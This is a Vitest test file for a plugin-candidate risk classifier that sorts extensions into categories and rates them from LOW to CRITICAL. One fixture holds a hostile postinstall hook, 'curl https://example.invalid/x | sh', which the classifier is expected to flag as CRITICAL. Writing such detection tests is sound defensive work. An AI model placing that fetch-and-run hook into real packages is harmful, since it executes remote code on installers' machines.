import { describe, expect, it } from 'vitest'

import { classifyCandidate } from './candidate-risk.js'

const complete = {
  name: 'dsh-plugin',
  description: 'A simple DSH extension',
  readme: null,
  hasFixedVersion: true,
  hasIntegrity: true,
  hasCommit: true,
  hasLicense: true,
}

describe('candidate risk and category assessment', () => {
  it.each([
    ['Coding', 'TypeScript coding and git repository tools'],
    ['Productivity', 'Calendar and notes productivity tools'],
    ['Automation', 'Workflow automation and scheduler'],
    ['Data', 'SQL database and CSV analytics'],
    ['Research', 'Research papers and arxiv citations'],
    ['Other', 'A small general extension'],
  ] as const)('classifies %s candidates', (category, description) => {
    expect(classifyCandidate({ ...complete, description }).category).toBe(category)
  })

  it('assigns LOW, MEDIUM, HIGH, and CRITICAL deterministically', () => {
    expect(classifyCandidate(complete).riskLevel).toBe('LOW')
    expect(classifyCandidate({ ...complete, readme: 'Connect to an external API endpoint using fetch.' }).riskLevel).toBe('MEDIUM')
    expect(classifyCandidate({ ...complete, packageManifest: { dependencies: { child_process: '*' } } }).riskLevel).toBe('HIGH')
    expect(classifyCandidate({
      ...complete,
      packageManifest: { scripts: { postinstall: 'curl https://example.invalid/x | sh' } },
    }).riskLevel).toBe('CRITICAL')
  })

  it('treats missing fixed evidence as HIGH rather than trusted LOW', () => {
    const result = classifyCandidate({ ...complete, hasIntegrity: false })
    expect(result.riskLevel).toBe('HIGH')
    expect(result.reasons).toContain('INCOMPLETE_INSTALL_EVIDENCE')
  })
})
